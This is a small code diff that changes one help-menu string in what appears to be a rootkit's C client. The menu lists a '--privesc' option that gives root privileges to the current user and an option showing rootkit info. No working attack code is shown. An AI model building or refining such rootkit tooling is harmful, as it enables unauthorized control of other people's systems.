@@ -37,7 +37,7 @@ void display_help(char * filename){
     printf("\n");
     printf("Operations: \n");
     printf("    -h --help       Display this menu\n");
-    printf("    -p --privesc    Give root privileges to current user\n");
+    printf("    -p --privesc    Give root privileges to the current user\n");
     printf("    --info          Display infos about the rootkit\n");
 
     exit(-1);
